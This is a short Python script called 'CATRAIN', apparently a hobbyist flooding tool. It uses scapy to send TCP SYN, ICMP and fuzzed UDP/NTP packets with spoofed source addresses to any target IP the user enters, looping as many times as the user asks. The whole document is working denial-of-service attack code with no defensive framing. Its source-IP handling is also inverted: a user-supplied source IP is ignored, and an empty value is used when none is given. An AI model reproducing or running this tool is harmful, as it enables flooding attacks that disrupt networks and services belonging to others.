print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 

from scapy.all import IP, TCP, ICMP, UDP, NTP, send, RawVal, fuzz # type: ignore // pip install scapy --python C:\path\to\python 

target_ip = input("IP: ") 
count = int(input("Count: ")) 
srcIp = input("Source IP (opt): ") 

if srcIp != "":
    packetT = IP(dst=target_ip, src="192.168.2.34") / TCP(flags="S") 
else: packetT = IP(dst=target_ip, src=srcIp) / TCP(flags="S") 
packetI = IP(dst=target_ip, src="192.168.2.34") / ICMP() 
packetU = IP(dst=target_ip, src="192.168.2.34") / fuzz(UDP()/NTP()) 

sent_count = 0 
for i in range(count):
    send(packetT) 
    send(packetI) 
    send(packetU) 
    sent_count += 1 
    print(f"Sent packet run #{sent_count} to IP {target_ip}") 
input("All sent~~") 
